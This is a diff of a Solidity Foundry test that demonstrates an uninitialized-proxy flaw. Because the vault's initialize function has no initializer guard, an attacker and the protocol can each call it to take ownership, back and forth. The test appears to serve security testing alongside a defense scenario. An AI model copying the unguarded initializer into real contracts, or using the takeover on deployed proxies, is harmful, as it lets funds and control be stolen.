@@ -240,12 +240,15 @@ contract UninitializedProxyTest is Test {
         // Attacker now owns the vault
         assertEq(vault.owner(), attacker, "Attacker owns the vault");
 
-        // Protocol's initialize call fails
+        // Protocol can also call initialize (no initializer guard!)
         vm.prank(owner);
-        vault.initialize(owner); // Won't revert but won't change owner either
+        vault.initialize(owner);
+        assertEq(vault.owner(), owner, "Protocol takes ownership back");
 
-        // Attacker still in control
-        assertEq(vault.owner(), attacker, "Attacker maintains control");
+        // But attacker can always re-take ownership — endless race condition!
+        vm.prank(attacker);
+        vault.initialize(attacker);
+        assertEq(vault.owner(), attacker, "Attacker takes ownership again");
     }
 
     function test_DefenseScenario_SecureVaultProtected() public {
